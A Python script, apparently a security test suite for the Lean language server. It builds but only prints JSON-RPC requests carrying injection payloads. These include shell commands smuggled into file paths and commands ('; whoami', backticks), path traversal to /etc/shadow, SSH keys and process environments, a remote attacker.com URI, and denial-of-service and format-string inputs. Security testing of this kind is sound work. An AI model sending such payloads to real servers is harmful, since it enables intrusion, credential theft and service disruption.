#!/usr/bin/env python3
"""
LSP Server Command Injection Test
Tests if Lean LSP server is vulnerable to command injection via file paths, URIs, etc.
"""

import json
import subprocess
import socket
import os
import sys

def test_lsp_command_injection():
    """Test if LSP accepts malicious file paths or commands"""

    print("=== LSP Server Command Injection Tests ===\n")

    # Test 1: Malicious file path in textDocument/didOpen
    malicious_paths = [
        "/tmp/test.lean; whoami",  # Command injection
        "/tmp/test.lean`whoami`",  # Backtick injection
        "/tmp/test.lean$(whoami)", # Command substitution
        "../../../etc/passwd",     # Path traversal
        "file:///etc/passwd",      # Absolute path URI
        "file://attacker.com/evil.lean",  # Remote URI
        "/tmp/\x00hidden",         # Null byte injection
    ]

    for path in malicious_paths:
        print(f"[Test] Malicious path: {path}")

        # LSP initialize request
        initialize = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize",
            "params": {
                "rootUri": None,
                "capabilities": {}
            }
        }

        # Try to open malicious file
        did_open = {
            "jsonrpc": "2.0",
            "method": "textDocument/didOpen",
            "params": {
                "textDocument": {
                    "uri": f"file://{path}",
                    "languageId": "lean4",
                    "version": 1,
                    "text": "def exploit : Nat := 42"
                }
            }
        }

        print(f"  URI: {did_open['params']['textDocument']['uri']}")
        print()

    # Test 2: Command injection via workspace/executeCommand
    print("\n[Test] Execute command injection")
    execute_cmd = {
        "jsonrpc": "2.0",
        "id": 2,
        "method": "workspace/executeCommand",
        "params": {
            "command": "lean4.refreshFileDependencies; whoami",
            "arguments": []
        }
    }
    print(f"  Command: {execute_cmd['params']['command']}")

    # Test 3: Path traversal in import resolution
    print("\n[Test] Path traversal in imports")
    traversal_code = """
    import ../../../../../../etc/passwd
    import ../../../../../../../tmp/malicious
    """

    # Test 4: Malicious configuration
    print("\n[Test] Malicious configuration")
    config = {
        "jsonrpc": "2.0",
        "method": "workspace/didChangeConfiguration",
        "params": {
            "settings": {
                "lean4": {
                    "extraOptions": ["--plugin=/tmp/evil.so; whoami"],
                    "serverArgs": ["--server", "; whoami"],
                }
            }
        }
    }
    print(f"  Config: {json.dumps(config['params']['settings'], indent=2)}")

def test_lsp_dos():
    """Test if LSP server can be crashed or DoS'd"""

    print("\n=== LSP DoS Tests ===\n")

    # Test 1: Extremely long file path
    print("[Test 1] Long file path")
    long_path = "/tmp/" + "A" * 100000 + ".lean"
    print(f"  Path length: {len(long_path)}")

    # Test 2: Deeply nested JSON
    print("\n[Test 2] Deeply nested JSON")
    nested = {"a": None}
    current = nested
    for i in range(10000):
        current["a"] = {"a": None}
        current = current["a"]
    print(f"  Nesting depth: 10000")

    # Test 3: Huge file content
    print("\n[Test 3] Huge file content")
    huge_content = "def x := 1\n" * 1000000
    print(f"  Content size: {len(huge_content)} bytes")

    # Test 4: Rapid-fire requests
    print("\n[Test 4] Request flooding")
    print("  Sending 10000 rapid requests...")

def test_lsp_path_traversal():
    """Test path traversal in file operations"""

    print("\n=== LSP Path Traversal Tests ===\n")

    traversal_paths = [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "~/.ssh/id_rsa",
        "../../../proc/self/environ",
    ]

    for path in traversal_paths:
        print(f"[Test] Path: {path}")
        request = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "textDocument/hover",
            "params": {
                "textDocument": {
                    "uri": f"file://{path}"
                },
                "position": {"line": 0, "character": 0}
            }
        }
        print(f"  Request: {json.dumps(request, indent=2)}")
        print()

def test_lsp_memory_corruption():
    """Test if LSP can be crashed with malformed input"""

    print("\n=== LSP Memory Corruption Tests ===\n")

    # Test 1: Invalid UTF-8
    print("[Test 1] Invalid UTF-8 sequences")
    invalid_utf8 = b'\xff\xfe\xfd' * 1000
    print(f"  Bytes: {invalid_utf8[:50]}...")

    # Test 2: Null bytes
    print("\n[Test 2] Null byte injection")
    null_injection = "def test\x00malicious := 42"
    print(f"  Content: {repr(null_injection)}")

    # Test 3: Format string attacks
    print("\n[Test 3] Format strings")
    format_strings = [
        "def %s%s%s%s := 42",
        "def %n%n%n%n := 42",
        "def %x%x%x%x := 42",
    ]
    for fs in format_strings:
        print(f"  Format: {fs}")

if __name__ == "__main__":
    print("Lean LSP Server Security Testing")
    print("=" * 50)
    print()

    test_lsp_command_injection()
    test_lsp_dos()
    test_lsp_path_traversal()
    test_lsp_memory_corruption()

    print("\n" + "=" * 50)
    print("LSP Security Test Suite Complete")
    print()
    print("NOTE: These are theoretical tests.")
    print("To actually test, run: lean --server < requests.json")
